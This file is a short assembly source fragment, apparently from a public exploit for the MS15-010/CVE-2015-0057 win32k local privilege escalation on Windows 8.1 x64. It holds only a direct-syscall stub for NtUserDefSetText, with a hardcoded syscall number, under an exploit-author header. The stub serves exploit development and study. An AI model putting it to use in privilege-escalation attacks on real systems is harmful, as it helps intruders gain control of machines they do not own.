; MS15-010/CVE-2015-0057 win32k Local Privilege Escalation
; Date: 2015-12-17
; Exploit author: Jean-Jamil Khalife
; Tested on Windows 8.1 x64 EN
; Home: http://www.hdwsec.fr
; Blog: http://www.hdwsec.fr/blog/


.CODE

NtUserDefSetText proc

	mov         r10, rcx
	mov         eax, 1080h
	syscall  
	ret  

NtUserDefSetText endp

END
